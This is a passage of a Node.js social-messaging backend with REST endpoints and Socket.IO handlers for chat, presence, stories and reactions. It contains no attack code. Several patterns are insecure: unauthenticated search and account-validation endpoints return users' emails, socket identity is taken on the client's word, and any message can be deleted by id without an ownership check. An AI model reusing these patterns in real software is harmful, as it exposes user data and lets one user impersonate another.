      return sendJson(res, 500, { error: 'Failed to save call' });
    }
  }

  // 4.9. Clear Call History
  if (pathname === '/api/social/calls' && req.method === 'DELETE') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    try {
      const myId = user.id;
      await pool.query(`DELETE FROM "SocialCall" WHERE "callerId" = $1 OR "receiverId" = $1`, [myId]);
      await pool.query(`DELETE FROM "SocialMessage" WHERE ("senderId" = $1 OR "receiverId" = $1) AND type = 'call'`, [myId]);
      return sendJson(res, 200, { success: true });
    } catch (err) {
      console.error('[Render API] clear calls error:', err);
      return sendJson(res, 500, { error: 'Failed to clear calls' });
    }
  }

  // 5. Global User Search (Optimized Multi-Field ILIKE search with exact, prefix & substring priority)
  if (pathname === '/api/social/search' && req.method === 'GET') {
    const user = await authenticateRequest(req);
    const myId = user ? user.id : '';

    if (user && !checkRateLimit(`search_${user.id}`, 25, 5)) {
      return sendJson(res, 429, { error: 'Please slow down search queries' });
    }

    const queryStr = (parsedUrl.searchParams.get('q') || '').trim();
    if (!queryStr) return sendJson(res, 200, { users: [] });

    try {
      const rawQ = queryStr.replace(/^@+/, '').trim();
      const exactPattern = rawQ;
      const prefixPattern = `${rawQ}%`;
      const substringPattern = `%${rawQ}%`;

      const { rows } = await pool.query(`
        SELECT id, username, email, name, image, bio, "lastSeen", "isOnline"
        FROM "User"
        WHERE ($1 = '' OR id != $1)
          AND (
            username ILIKE $2 OR
            email ILIKE $2 OR
            name ILIKE $2
          )
        ORDER BY
          CASE
            WHEN username ILIKE $3 THEN 1
            WHEN email ILIKE $3 THEN 2
            WHEN username ILIKE $4 THEN 3
            WHEN name ILIKE $4 THEN 4
            ELSE 5
          END,
          "isOnline" DESC,
          username ASC
        LIMIT 40
      `, [myId, substringPattern, exactPattern, prefixPattern]);

      const users = rows.map(u => ({
        id: u.id,
        username: u.username,
        name: u.name || u.username,
        email: u.email,
        image: u.image || '',
        bio: u.bio,
        isOnline: Boolean(u.isOnline),
        lastSeen: u.lastSeen ? new Date(u.lastSeen).toISOString() : null
      }));

      return sendJson(res, 200, { users });
    } catch (err) {
      console.error('[Render API] search error:', err);
      return sendJson(res, 500, { error: 'Search failed' });
    }
  }

  // 6. User Profile & Posts
  if (pathname.startsWith('/api/social/profile') && req.method === 'GET') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    try {
      const parts = pathname.split('/').filter(Boolean);
      const targetUserId = parts[3] ? parts[3] : user.id;

      const userQuery = pool.query(`
        SELECT id, username, email, name, image, bio, website, phone, "isPrivate", "isOnline", "lastSeen"
        FROM "User"
        WHERE id = $1
        LIMIT 1
      `, [targetUserId]);

      const postsQuery = pool.query(`
        SELECT id, "thumbnailUrl", "imageUrl", caption, "postType", "createdAt"
        FROM "Post"
        WHERE "userId" = $1
        ORDER BY "createdAt" DESC
        LIMIT 36
      `, [targetUserId]);

      const [userRes, postsRes] = await Promise.all([userQuery, postsQuery]);

      if (userRes.rows.length === 0) return sendJson(res, 404, { error: 'User not found' });

      return sendJson(res, 200, {
        user: userRes.rows[0],
        posts: postsRes.rows
      });
    } catch (err) {
      console.error('[Render API] profile error:', err);
      return sendJson(res, 500, { error: 'Failed to fetch profile' });
    }
  }

  // 7. Update Profile Details & Canonical Username
  if (pathname === '/api/social/profile' && req.method === 'PUT') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const body = await parseJsonBody(req);
    if (!body) return sendJson(res, 400, { error: 'Invalid profile payload' });

    try {
      const myId = user.id;
      const { name, bio, website, image, phone, isPrivate, username } = body;

      if (username) {
        const cleanUser = username.replace(/^@+/, '').trim();
        const existing = await pool.query(`SELECT id FROM "User" WHERE (username ILIKE $1) AND id != $2 LIMIT 1`, [cleanUser, myId]);
        if (existing.rows.length > 0) return sendJson(res, 400, { error: 'Username is already taken' });

        await pool.query(`UPDATE "User" SET username = $1 WHERE id = $2`, [cleanUser, myId]);
      }

      const updateQuery = `
        UPDATE "User"
        SET 
          name = COALESCE($1, name),
          bio = COALESCE($2, bio),
          website = COALESCE($3, website),
          image = CASE WHEN $4 = '__REMOVE__' OR $4 = '' THEN NULL WHEN $4 IS NOT NULL THEN $4 ELSE image END,
          phone = COALESCE($5, phone),
          "isPrivate" = COALESCE($6, "isPrivate")
        WHERE id = $7
        RETURNING id, username, email, name, image, bio, website, phone, "isPrivate"
      `;

      const { rows } = await pool.query(updateQuery, [name, bio, website, image, phone, isPrivate, myId]);
      const updatedUser = rows[0];

      // Broadcast profile update across all sockets
      io.emit('user_profile_updated', {
        userId: updatedUser.id,
        email: updatedUser.email,
        username: updatedUser.username,
        image: updatedUser.image,
        bio: updatedUser.bio
      });

      return sendJson(res, 200, { success: true, user: updatedUser });
    } catch (err) {
      console.error('[Render API] update profile error:', err);
      return sendJson(res, 500, { error: 'Failed to update profile' });
    }
  }

  // 8. Shared Media Attachments
  if (pathname.startsWith('/api/social/media/') && req.method === 'GET') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const otherUserId = pathname.replace('/api/social/media/', '').trim();
    if (!otherUserId) return sendJson(res, 400, { error: 'otherUserId required' });

    try {
      const myId = user.id;
      const { rows } = await pool.query(`
        SELECT id, content, type, "createdAt", "senderId", "mediaUrl", "thumbnailUrl"
        FROM "SocialMessage"
        WHERE (
          ("senderId" = $1 AND "receiverId" = $2 AND "deletedBySender" = false) OR
          ("senderId" = $2 AND "receiverId" = $1 AND "deletedByReceiver" = false)
        )
        AND type IN ('image', 'video', 'voice', 'file', 'media_album')
        ORDER BY "createdAt" DESC
        LIMIT 500
      `, [myId, otherUserId]);

      return sendJson(res, 200, { media: rows });
    } catch (err) {
      console.error('[Render API] shared media error:', err);
      return sendJson(res, 500, { error: 'Failed to fetch shared media' });
    }
  }

  // 9. Accounts Center Validation
  if (pathname === '/api/accounts/validate' && req.method === 'POST') {
    const body = await parseJsonBody(req);
    const accounts = Array.isArray(body?.accounts) ? body.accounts : [];

    if (accounts.length === 0) return sendJson(res, 200, { validUserIds: [], validEmails: [], existingUsers: [] });

    try {
      const ids = accounts.map(a => a.userId).filter(Boolean);
      const emails = accounts.map(a => a.email?.toLowerCase().trim()).filter(Boolean);

      const { rows } = await pool.query(`
        SELECT id, email, username, image
        FROM "User"
        WHERE id = ANY($1::text[]) OR LOWER(email) = ANY($2::text[])
      `, [ids, emails]);

      return sendJson(res, 200, {
        validUserIds: rows.map(u => u.id),
        validEmails: rows.map(u => u.email?.toLowerCase().trim()).filter(Boolean),
        existingUsers: rows
      });
    } catch (err) {
      console.error('[Render API] validate accounts error:', err);
      return sendJson(res, 500, { error: 'Account validation failed' });
    }
  }

  // 10. Message Emoji Reactions
  if (pathname === '/api/social/messages/react' && req.method === 'POST') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const body = await parseJsonBody(req);
    if (!body || !body.messageId || !body.emoji) {
      return sendJson(res, 400, { error: 'Invalid reaction payload' });
    }

    try {
      const myId = user.id;
      const { messageId, emoji, receiverId, receiverEmail } = body;
      const reactionId = `react_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;

      const existing = await pool.query(
        `SELECT id, emoji FROM "SocialReaction" WHERE "userId" = $1 AND "messageId" = $2`,
        [myId, messageId]
      );

      if (existing.rows.length > 0) {
        if (existing.rows[0].emoji === emoji) {
          await pool.query(`DELETE FROM "SocialReaction" WHERE id = $1`, [existing.rows[0].id]);
        } else {
          await pool.query(`UPDATE "SocialReaction" SET emoji = $1 WHERE id = $2`, [emoji, existing.rows[0].id]);
        }
      } else {
        await pool.query(
          `INSERT INTO "SocialReaction" (id, emoji, "userId", "messageId") VALUES ($1, $2, $3, $4)`,
          [reactionId, emoji, myId, messageId]
        );
      }

      const payload = { messageId, emoji, userId: myId };
      const reactionRooms = [
        receiverEmail ? receiverEmail.toLowerCase().trim() : null,
        receiverEmail ? `user:${receiverEmail.toLowerCase().trim()}` : null,
        receiverId ? String(receiverId).trim() : null,
        receiverId ? `user:${String(receiverId).trim()}` : null,
        myId,
        `user:${myId}`
      ].filter(Boolean);
      for (const room of reactionRooms) {
        io.to(room).emit('receive_social_reaction', payload);
      }

      return sendJson(res, 200, { success: true });
    } catch (err) {
      console.error('[Render API] reaction error:', err);
      return sendJson(res, 500, { error: 'Failed to react to message' });
    }
  }

  // 11. Ephemeral 24-Hour Stories
  if (pathname === '/api/social/stories' && req.method === 'GET') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    try {
      const twentyFourHoursAgo = new Date(Date.now() - 24 * 60 * 60 * 1000);
      const { rows } = await pool.query(`
        SELECT s.id, s."imageUrl", s."createdAt", u.id as user_id, u.username, u.image as user_image
        FROM "Story" s
        JOIN "User" u ON u.id = s."userId"
        WHERE s."createdAt" >= $1
        ORDER BY s."createdAt" ASC
      `, [twentyFourHoursAgo]);

      const stories = rows.map(s => ({
        id: s.id,
        imageUrl: s.imageUrl,
        createdAt: s.createdAt ? new Date(s.createdAt).toISOString() : null,
        userId: s.user_id,
        username: s.username,
        userImage: s.user_image
      }));

      return sendJson(res, 200, { stories });
    } catch (err) {
      console.error('[Render API] get stories error:', err);
      return sendJson(res, 500, { error: 'Failed to fetch stories' });
    }
  }

  if (pathname === '/api/social/stories' && req.method === 'POST') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const body = await parseJsonBody(req);
    if (!body || !body.imageUrl) return sendJson(res, 400, { error: 'imageUrl required' });

    try {
      const myId = user.id;
      const storyId = `story_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
      const now = new Date();

      const { rows } = await pool.query(`
        INSERT INTO "Story" (id, "imageUrl", "userId", "createdAt")
        VALUES ($1, $2, $3, $4)
        RETURNING *
      `, [storyId, body.imageUrl, myId, now]);

      const story = {
        ...rows[0],
        username: user.username,
        createdAt: rows[0].createdAt.toISOString()
      };

      io.emit('story_posted', story);
      return sendJson(res, 200, { success: true, story });
    } catch (err) {
      console.error('[Render API] post story error:', err);
      return sendJson(res, 500, { error: 'Failed to post story' });
    }
  }

  if (pathname.startsWith('/api/social/stories/') && req.method === 'DELETE') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const storyId = pathname.replace('/api/social/stories/', '').trim();
    try {
      const myId = user.id;
      await pool.query(`DELETE FROM "Story" WHERE id = $1 AND "userId" = $2`, [storyId, myId]);
      io.emit('story_deleted', { storyId });
      return sendJson(res, 200, { success: true });
    } catch (err) {
      console.error('[Render API] delete story error:', err);
      return sendJson(res, 500, { error: 'Failed to delete story' });
    }
  }

  // 12. Chat Nicknames
  if (pathname === '/api/social/nicknames' && req.method === 'GET') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    try {
      const myId = user.id;
      const { rows } = await pool.query(`SELECT "targetId", "nickname" FROM "ChatNickname" WHERE "userId" = $1`, [myId]);
      const nicknames = {};
      rows.forEach(r => { nicknames[r.targetId] = r.nickname; });
      return sendJson(res, 200, { nicknames });
    } catch (err) {
      console.error('[Render API] get nicknames error:', err);
      return sendJson(res, 500, { error: 'Failed to get nicknames' });
    }
  }

  if (pathname === '/api/social/nicknames' && req.method === 'PUT') {
    const user = await authenticateRequest(req);
    if (!user) return sendJson(res, 401, { error: 'Unauthorized' });

    const body = await parseJsonBody(req);
    if (!body || !body.targetId) return sendJson(res, 400, { error: 'targetId required' });

    try {
      const myId = user.id;
      const { targetId, nickname, targetEmail } = body;

      if (!nickname || !nickname.trim()) {
        await pool.query(`DELETE FROM "ChatNickname" WHERE "userId" = $1 AND "targetId" = $2`, [myId, targetId]);
      } else {
        const id = `nick_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
        await pool.query(`
          INSERT INTO "ChatNickname" (id, "userId", "targetId", nickname, "createdAt", "updatedAt")
          VALUES ($1, $2, $3, $4, NOW(), NOW())
          ON CONFLICT ("userId", "targetId") DO UPDATE SET nickname = $4, "updatedAt" = NOW()
        `, [id, myId, targetId, nickname.trim()]);
      }

      if (targetEmail) io.to(targetEmail.toLowerCase().trim()).emit('receive_nickname', { targetId, nickname });
      io.to(String(targetId).trim()).emit('receive_nickname', { targetId, nickname });

      return sendJson(res, 200, { success: true });
    } catch (err) {
      console.error('[Render API] update nickname error:', err);
      return sendJson(res, 500, { error: 'Failed to update nickname' });
    }
  }

  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Connect Node.js API & Socket Server is running');
});

// ── Socket.IO Server Setup ──────────────────────────────────────────────────
const allowedOrigins = process.env.CLIENT_URL 
  ? process.env.CLIENT_URL.split(',').map(s => s.trim()) 
  : '*';

const io = new Server(httpServer, {
  cors: {
    origin: allowedOrigins,
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    credentials: true
  },
  pingTimeout: 20000,
  pingInterval: 10000,
  maxHttpBufferSize: 1e7, // 10MB limit for rich media
  transports: ['websocket', 'polling']
});

// Server-side sliding window message deduplication cache
const recentlyEmittedMessages = new Map(); // messageId -> timestamp
const MESSAGE_DEDUP_TTL_MS = 15000;

function recordRecentlyEmitted(msgId) {
  if (!msgId) return;
  recentlyEmittedMessages.set(String(msgId), Date.now());
}

function isRecentlyEmitted(msgId) {
  if (!msgId) return false;
  return recentlyEmittedMessages.has(String(msgId));
}

function pruneEmittedMessages() {
  const now = Date.now();
  for (const [id, time] of recentlyEmittedMessages.entries()) {
    if (now - time > MESSAGE_DEDUP_TTL_MS) {
      recentlyEmittedMessages.delete(id);
    }
  }
}
setInterval(pruneEmittedMessages, 30000);

// A user can be in email, ID, and user:ID/username rooms. Emit strictly once per socket.
// excludeSocketId: skip a specific socket (e.g. the sender's current tab)
// excludeUserId: skip ALL sockets belonging to a user (e.g. sender from REST broadcast)
function emitSocialMessageToTargets(targets, message, excludeSocketId = null, excludeUserId = null) {
  if (!message) return;

  const socketIds = new Set();
  const roomsToTarget = new Set();

  for (const target of targets) {
    if (!target) continue;

    if (target.email) {
      const emailRoom = String(target.email).toLowerCase().trim();
      roomsToTarget.add(emailRoom);
      roomsToTarget.add(`user:${emailRoom}`);
    }

    if (target.id) {
      const id = String(target.id).trim();
      roomsToTarget.add(id);
      roomsToTarget.add(`user:${id}`);
    }

    if (target.username) {
      const cleanUser = String(target.username).replace(/^@+/, '').toLowerCase().trim();
      roomsToTarget.add(cleanUser);
      roomsToTarget.add(`user:${cleanUser}`);
      roomsToTarget.add(`cam_username_${cleanUser}`);
    }
  }

  for (const room of roomsToTarget) {
    for (const socketId of io.sockets.adapter.rooms.get(room) || []) {
      socketIds.add(socketId);
    }
  }

  // Build set of socket IDs to exclude when excludeUserId is specified
  const excludedSocketIds = new Set();
  if (excludeSocketId) excludedSocketIds.add(excludeSocketId);
  if (excludeUserId) {
    const uid = String(excludeUserId).trim();
    // Sender may be in rooms keyed by userId, email, or username — collect all their sockets
    for (const room of [uid, `user:${uid}`]) {
      for (const sid of io.sockets.adapter.rooms.get(room) || []) {
        excludedSocketIds.add(sid);
      }
    }
    // Also check by socket.userId property
    for (const [sid, s] of io.sockets.sockets) {
      if (s.userId && String(s.userId).trim() === uid) {
        excludedSocketIds.add(sid);
      }
    }
  }

  let deliveredCount = 0;
  // Emit strictly once per unique socket to completely eliminate duplicate notifications
  for (const socketId of socketIds) {
    if (!excludedSocketIds.has(socketId)) {
      const s = io.sockets.sockets.get(socketId);
      if (s && s.connected) {
        s.emit('receive_social_message', message);
        deliveredCount++;
      }
    }
  }

  // If delivered to at least one active recipient socket, notify sender with delivery receipt
  if (deliveredCount > 0 && (message.senderId || message.senderEmail)) {
    const senderRooms = [
      message.senderId ? String(message.senderId).trim() : null,
      message.senderId ? `user:${String(message.senderId).trim()}` : null,
      message.senderEmail ? String(message.senderEmail).toLowerCase().trim() : null,
      message.senderEmail ? `user:${String(message.senderEmail).toLowerCase().trim()}` : null
    ].filter(Boolean);

    const deliveryPayload = {
      messageId: message.id,
      receiverId: message.receiverId,
      deliveredAt: new Date().toISOString()
    };
    for (const r of senderRooms) {
      io.to(r).emit('message_delivered', deliveryPayload);
    }
  }
}

// Track online users: identifier -> Set of socket IDs (multiple tabs)
const onlineUsers = new Map(); // email or userId -> Set<socketId>

// Live server activity / events counter
let totalServerActivityCount = 1;
function recordActivity() {
  totalServerActivityCount++;
}

// Track per-socket heartbeat timestamp for crash detection
const heartbeatMap = new Map(); // socketId -> { userId, email, timestamp }

// Track which socket is in an active call
const activeCalls = new Set();
const activeCallInfo = new Map();
const callRateLimitMap = new Map();
const CALL_RATE_LIMIT_MS = 3000;

function getRoomSockets(target) {
  if (!target) return new Set();
  return io.sockets.adapter.rooms.get(target) || new Set();
}

function broadcastOnlineUsers() {
  const onlineList = Array.from(onlineUsers.keys());
  io.emit('online_users', onlineList);
}

async function persistUserPresence(userId, email, isOnline, lastSeen) {
  if (!pool || (!userId && !email)) return;
  try {
    const ts = lastSeen ? new Date(lastSeen) : new Date();
    const idVal = userId ? String(userId).trim() : '';
    const emailVal = email ? String(email).trim().toLowerCase() : '';
    await pool.query(
      `UPDATE "User" 
       SET "isOnline" = $1, "lastSeen" = $2, "lastHeartbeat" = NOW() 
       WHERE (id = $3 AND $3 <> '') OR (email ILIKE $4 AND $4 <> '')`,
      [Boolean(isOnline), ts, idVal, emailVal]
    );
  } catch (err) {
    console.error('[DB persistUserPresence error]', err.message);
  }
}

function broadcastActivityUpdate(userId, email, isOnline, lastSeen) {
  const lastSeenStr = lastSeen || new Date().toISOString();
  io.emit('activity_update', {
    userId,
    email: email ? email.toLowerCase().trim() : undefined,
    isOnline,
    lastSeen: lastSeenStr
  });
  persistUserPresence(userId, email, isOnline, lastSeenStr);
}

// 30-Second Sweep for Stale Heartbeats
setInterval(() => {
  const now = Date.now();
  const STALE_THRESHOLD_MS = 60 * 1000;
  let anyCleaned = false;

  for (const [socketId, data] of heartbeatMap.entries()) {
    const staleness = now - data.timestamp;
    if (staleness > STALE_THRESHOLD_MS) {
      const { userId, email } = data;
      [email, userId].filter(Boolean).forEach(key => {
        const sockets = onlineUsers.get(key);
        if (sockets) {
          sockets.delete(socketId);
          if (sockets.size === 0) onlineUsers.delete(key);
        }
      });
      heartbeatMap.delete(socketId);
      anyCleaned = true;

      const lastSeen = new Date(data.timestamp).toISOString();
      broadcastActivityUpdate(userId, email, false, lastSeen);
    }
  }

  if (anyCleaned) {
    broadcastOnlineUsers();
  }
}, 30 * 1000);

io.on('connection', (socket) => {
  socket.activeTypingRooms = new Set();
  socket.emit('online_users', Array.from(onlineUsers.keys()));

  // IDENTIFY
  socket.on('identify', ({ email, userId, username }) => {
    if (email) {
      const emailRoom = email.toLowerCase().trim();
      socket.join(emailRoom);
      socket.join(`user:${emailRoom}`);
      socket.join('cam_room_' + emailRoom);
      socket.userEmail = emailRoom;
      socket.camEmail = emailRoom;
      socket.camUsername = username || 'User';
      socket.username = username || 'User';
      if (!onlineUsers.has(emailRoom)) onlineUsers.set(emailRoom, new Set());
      onlineUsers.get(emailRoom).add(socket.id);
    }

    if (userId) {
      const idRoom = String(userId).trim();
      socket.join(idRoom);
      socket.join(`user:${idRoom}`); // Canonical personal room
      socket.userId = idRoom;
      if (!onlineUsers.has(idRoom)) onlineUsers.set(idRoom, new Set());
      onlineUsers.get(idRoom).add(socket.id);
    }

    if (username) {
      const cleanUser = String(username).replace(/^@+/, '').toLowerCase().trim();
      socket.join(cleanUser);
      socket.join(`user:${cleanUser}`);
      const usernameRoom = `cam_username_${cleanUser}`;
      if (usernameRoom.length > 'cam_username_'.length) socket.join(usernameRoom);
      socket.username = cleanUser;
      if (!onlineUsers.has(cleanUser)) onlineUsers.set(cleanUser, new Set());
      onlineUsers.get(cleanUser).add(socket.id);
    }

    heartbeatMap.set(socket.id, {
      userId: socket.userId,
      email: socket.userEmail,
      timestamp: Date.now()
    });

    broadcastActivityUpdate(socket.userId, socket.userEmail, true, new Date().toISOString());
    broadcastOnlineUsers();
  });

  // HEARTBEAT
  socket.on('heartbeat', ({ userId, email }) => {
    const uid = socket.userId || userId;
    const eml = socket.userEmail || (email ? email.toLowerCase().trim() : undefined);
    heartbeatMap.set(socket.id, {
      userId: uid,
      email: eml,
      timestamp: Date.now()
    });
    if (pool && (uid || eml)) {
      const idVal = uid ? String(uid).trim() : '';
      const emailVal = eml ? String(eml).trim().toLowerCase() : '';
      pool.query(
        `UPDATE "User" SET "lastHeartbeat" = NOW(), "isOnline" = true WHERE (id = $1 AND $1 <> '') OR (email ILIKE $2 AND $2 <> '')`,
        [idVal, emailVal]
      ).catch(() => {});
    }
  });

  // MESSAGING
  socket.on('send_social_message', async (data) => {
    if (!data) return;

    // Rate limiter: max 30 msgs per 5s per socket / user
    const rateLimitKey = `sock_msg_${socket.userId || socket.userEmail || socket.id}`;
    if (!checkRateLimit(rateLimitKey, 30, 6)) {
      socket.emit('error_notification', { message: 'Sending messages too quickly. Please slow down.' });
      return;
    }

    const senderEmailRoom = socket.userEmail ? socket.userEmail.toLowerCase().trim() : null;

    let targetUsername = data.receiverUsername || null;
    let targetEmail = data.receiverEmail;
    let targetId = data.receiverId;

    if (pool && (data.receiverId || data.receiverEmail)) {
      try {
        const lookup = data.receiverId || data.receiverEmail;
        const res = await pool.query(
          `SELECT id, email, username FROM "User" WHERE id = $1 OR email ILIKE $2 OR username ILIKE $2 LIMIT 1`,
          [lookup, String(lookup).trim().toLowerCase()]
        );
        if (res.rows.length > 0) {
          targetId = res.rows[0].id;
          targetEmail = res.rows[0].email;
          targetUsername = res.rows[0].username;
        }
      } catch (e) {}
    }

    let finalSenderId = socket.userId || data.senderId;
    if (pool && (socket.userId || data.senderId || socket.userEmail || data.senderEmail)) {
      try {
        const sLookup = socket.userId || data.senderId || socket.userEmail || data.senderEmail;
        const sRes = await pool.query(
          `SELECT id, email, username FROM "User" WHERE id = $1 OR email ILIKE $2 OR username ILIKE $2 LIMIT 1`,
          [sLookup, String(sLookup).trim().toLowerCase()]
        );
        if (sRes.rows.length > 0) {
          finalSenderId = sRes.rows[0].id;
        }
      } catch (e) {}
    }

    const msgId = data.id || `msg_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
    const alreadyEmitted = isRecentlyEmitted(msgId);
    recordRecentlyEmitted(msgId);

    // If message was not already persisted in DB (e.g. sent directly over socket or REST failed), persist it
    if (pool && !alreadyEmitted && targetId && finalSenderId) {
      try {
        const existing = await pool.query(`SELECT id FROM "SocialMessage" WHERE id = $1 LIMIT 1`, [msgId]);
        if (existing.rows.length === 0) {
          const insertSql = `
            INSERT INTO "SocialMessage" (
              id, content, type, "senderId", "receiverId", "createdAt", "isSeen",
              "deletedBySender", "deletedByReceiver",
              "replyToId", "replyToContent", "replyToSenderName",
              "mediaUrl", "thumbnailUrl", "mimeType", "fileSize", "width", "height", "duration", "storagePath"
            ) VALUES (
              $1, $2, $3, $4, $5, $6, false,
              false, false,
              $7, $8, $9,
              $10, $11, $12, $13, $14, $15, $16, $17
            ) ON CONFLICT (id) DO NOTHING
          `;
          await pool.query(insertSql, [
            msgId,
            data.content || '',
            data.type || 'text',
            finalSenderId,
            targetId,
            data.createdAt ? new Date(data.createdAt) : new Date(),
            data.replyToId || null,
            data.replyToContent || null,
            data.replyToSenderName || null,
            data.mediaUrl || null,
            data.thumbnailUrl || null,
            data.mimeType || null,
            data.fileSize || null,
            data.width || null,
            data.height || null,
            data.duration || null,
            data.storagePath || null
          ]);

          // Automatically unhide chat for both users if previously hidden
          await pool.query(
            `DELETE FROM "HiddenSocialChat" 
             WHERE ("userId" = $1 AND "hiddenUserId" = $2) 
                OR ("userId" = $2 AND "hiddenUserId" = $1)`,
            [finalSenderId, targetId]
          );
        }
      } catch (dbErr) {
        console.error('[Socket send_social_message DB persist error]', dbErr.message);
      }
    }

    // Enrich data with sender identity from socket.identify so receiver can build contact immediately
    const enriched = {
      ...data,
      id: msgId,
      senderId: finalSenderId || data.senderId || socket.userId,
      senderEmail: data.senderEmail || senderEmailRoom || '',
      senderUsername: data.senderUsername || socket.username || socket.camUsername || 'User',
      receiverId: targetId || data.receiverId,
      createdAt: data.createdAt || new Date().toISOString(),
      reactions: data.reactions || []
    };

    if (alreadyEmitted) {
      // Receiver was already delivered via REST POST response. Only sync to sender's other tabs.
      emitSocialMessageToTargets([
        { id: socket.userId, email: socket.userEmail, username: socket.username }
      ], enriched, socket.id);
    } else {
      // First time emission: deliver to receiver targets and sender's other tabs
      emitSocialMessageToTargets([
        { id: targetId, email: targetEmail, username: targetUsername },
        { id: data.receiverId, email: data.receiverEmail },
        { id: socket.userId, email: socket.userEmail, username: socket.username },
      ], enriched, socket.id);
    }
  });

  socket.on('delete_social_message', async (data) => {
    if (!data) return;
    const { receiverEmail, receiverId, messageId, deleteFor, ...deleteData } = data;

    if (pool && messageId && deleteFor === 'everyone') {
      try {
        await pool.query(
          `UPDATE "SocialMessage" SET type = 'deleted', content = 'This message was deleted' WHERE id = $1`,
          [messageId]
        );
      } catch (e) {
        console.error('[Socket delete_social_message DB error]', e.message);
      }
    }

    const targetRooms = [
      receiverEmail ? receiverEmail.toLowerCase().trim() : null,
      receiverEmail ? `user:${receiverEmail.toLowerCase().trim()}` : null,
      receiverId ? String(receiverId).trim() : null,
      receiverId ? `user:${String(receiverId).trim()}` : null,
    ].filter(Boolean);
    for (const r of targetRooms) {
      socket.to(r).emit('receive_social_delete', { messageId, deleteFor, ...deleteData });
    }
  });

  socket.on('react_social_message', async (data) => {
    const { receiverEmail, receiverId, ...reactionData } = data;
    const myId = socket.userId;
    if (pool && myId && reactionData.messageId && reactionData.emoji) {
      try {
        const { messageId, emoji } = reactionData;
        const existing = await pool.query(
          `SELECT id, emoji FROM "SocialReaction" WHERE "userId" = $1 AND "messageId" = $2`,
          [myId, messageId]
        );
        if (existing.rows.length > 0) {
          if (existing.rows[0].emoji === emoji) {
            await pool.query(`DELETE FROM "SocialReaction" WHERE id = $1`, [existing.rows[0].id]);
          } else {
            await pool.query(`UPDATE "SocialReaction" SET emoji = $1 WHERE id = $2`, [emoji, existing.rows[0].id]);
          }
        } else {
          const reactionId = `react_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
          await pool.query(
            `INSERT INTO "SocialReaction" (id, emoji, "userId", "messageId") VALUES ($1, $2, $3, $4)`,
            [reactionId, emoji, myId, messageId]
          );
        }
      } catch (rxErr) {
        console.error('[Socket react error]', rxErr.message);
      }
    }
    const targetRooms = [
      receiverEmail ? receiverEmail.toLowerCase().trim() : null,
      receiverEmail ? `user:${receiverEmail.toLowerCase().trim()}` : null,
      receiverId ? String(receiverId).trim() : null,
      receiverId ? `user:${String(receiverId).trim()}` : null,
    ].filter(Boolean);
    for (const r of targetRooms) {
      socket.to(r).emit('receive_social_reaction', reactionData);
    }
  });

  socket.on('change_chat_theme', (data) => {
    const { receiverEmail, receiverId, ...themeData } = data;
    const targetRooms = [
      receiverEmail ? receiverEmail.toLowerCase().trim() : null,
      receiverEmail ? `user:${receiverEmail.toLowerCase().trim()}` : null,
      receiverId ? String(receiverId).trim() : null,
      receiverId ? `user:${String(receiverId).trim()}` : null,
    ].filter(Boolean);
    for (const r of targetRooms) {
      socket.to(r).emit('receive_chat_theme', themeData);
    }
  });

  socket.on('change_nickname', (data) => {
    const { receiverEmail, receiverId, ...nicknameData } = data;
    const targetRooms = [
      receiverEmail ? receiverEmail.toLowerCase().trim() : null,
      receiverEmail ? `user:${receiverEmail.toLowerCase().trim()}` : null,
      receiverId ? String(receiverId).trim() : null,
      receiverId ? `user:${String(receiverId).trim()}` : null,
    ].filter(Boolean);
    for (const r of targetRooms) {
      socket.to(r).emit('receive_nickname', nicknameData);
    }
  });

  socket.on('user_profile_updated', (data) => {
    recordActivity();
    socket.broadcast.emit('user_profile_updated', data);
  });

  socket.on('like_profile', (data) => {
    recordActivity();
    socket.broadcast.emit('profile_liked', data);
    const targetUserId = data?.targetUserId ? String(data.targetUserId).trim() : null;
    const targetEmail = data?.targetEmail ? String(data.targetEmail).toLowerCase().trim() : null;
    const targetSockets = new Set([
      ...getRoomSockets(targetUserId),
      ...getRoomSockets(targetUserId ? `user:${targetUserId}` : null),
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetEmail ? `user:${targetEmail}` : null),
    ]);
    emitToSocketsOnce(targetSockets, 'profile_liked_notification', data);
  });

  socket.on('follow_user', (data) => {
    recordActivity();
    socket.broadcast.emit('user_followed', data);
    const targetUserId = data?.targetUserId ? String(data.targetUserId).trim() : null;
    const targetEmail = data?.targetEmail ? String(data.targetEmail).toLowerCase().trim() : null;
    const targetSockets = new Set([
      ...getRoomSockets(targetUserId),
      ...getRoomSockets(targetUserId ? `user:${targetUserId}` : null),
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetEmail ? `user:${targetEmail}` : null),
    ]);
    emitToSocketsOnce(targetSockets, 'user_followed_notification', data);
  });

  socket.on('get_server_edge_count', () => {
    recordActivity();
    socket.emit('server_edge_count', totalServerActivityCount);
  });

  socket.on('social_request_event', (data) => {
    const { targetEmail, targetUserId, ...eventData } = data;
    if (targetEmail) socket.to(targetEmail.toLowerCase().trim()).emit('receive_social_request_event', eventData);
    if (targetUserId) socket.to(String(targetUserId).trim()).emit('receive_social_request_event', eventData);
  });

  // TYPING
  socket.on('typing', ({ receiverEmail, receiverId }) => {
    const payload = { email: socket.userEmail, userId: socket.userId, username: socket.username };
    const targetRooms = [
      receiverEmail ? receiverEmail.toLowerCase().trim() : null,
      receiverEmail ? `user:${receiverEmail.toLowerCase().trim()}` : null,
